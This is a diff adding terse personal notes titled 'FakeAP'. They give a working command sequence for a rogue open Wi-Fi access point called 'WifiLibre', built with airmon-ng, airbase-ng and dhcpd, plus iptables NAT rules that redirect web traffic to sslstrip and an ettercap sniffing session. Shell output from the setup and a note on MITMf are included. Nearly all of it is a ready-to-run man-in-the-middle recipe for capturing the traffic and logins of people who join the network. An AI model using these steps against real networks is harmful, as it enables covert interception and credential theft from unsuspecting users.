@@ -1,3 +1,54 @@
+FakeAP
+
+- install dhcpd
+- nano /etc/dhcpd.conf
+                    authoritative;
+                    default-lease-time 600;
+                    max-lease-time 7200;
+                    subnet 192.168.1.0 netmask 255.255.255.0 {
+                    option routers 192.168.1.1;
+                    option subnet-mask 255.255.255.0;
+                    option domain-name "WifiLibre";
+                    option domain-name-servers 192.168.1.1;
+                    range 192.168.1.2 192.168.1.40;
+                    }
+
+- airmon-ng start wlan0
+- airbase-ng -c 11 -e WifiLibre wlan0mon
+- root@Jamon:~# ifconfig at0 192.168.1.1 netmask 255.255.255.0
+- root@Jamon:~# ifconfig at0 mtu 1500
+- root@Jamon:~# route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+- root@Jamon:~# echo 1 > /proc/sys//net/ipv4/ip_forward
+- root@Jamon:~# iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.0.1
+- root@Jamon:~# iptables -P FORWARD ACCEPT
+- root@Jamon:~# iptables --append FORWARD --in-interface at0 -j ACCEPT
+- root@Jamon:~# iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
+- root@Jamon:~# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+- root@Jamon:~# dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
+                Internet Systems Consortium DHCP Server 4.3.1
+                Copyright 2004-2014 Internet Systems Consortium.
+                All rights reserved.
+                For info, please visit https://www.isc.org/software/dhcp/
+                Config file: /etc/dhcpd.conf
+                Database file: /var/lib/dhcp/dhcpd.leases
+                PID file: /var/run/dhcpd.pid
+                Wrote 1 leases to leases file.
+                Listening on LPF/at0/00:1a:ef:06:bb:47/192.168.1.0/24
+                Sending on   LPF/at0/00:1a:ef:06:bb:47/192.168.1.0/24
+                Sending on   Socket/fallback/fallback-net
+- root@Jamon:~# /etc/init.d/isc-dhcp-server start
+                [ ok ] Starting isc-dhcp-server (via systemctl): isc-dhcp-server.service.
+- sslstrip -f -p -k 10000
+- ettercap -p -u -T -q -i at0
+- 
+
+
+
+
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
 mitmf
 "MITMf on the kali repos is deprecated. Use the instructions on the wiki (https://github.com/byt3bl33d3r/MITMf/wiki/Installation) to get the latest version."
 
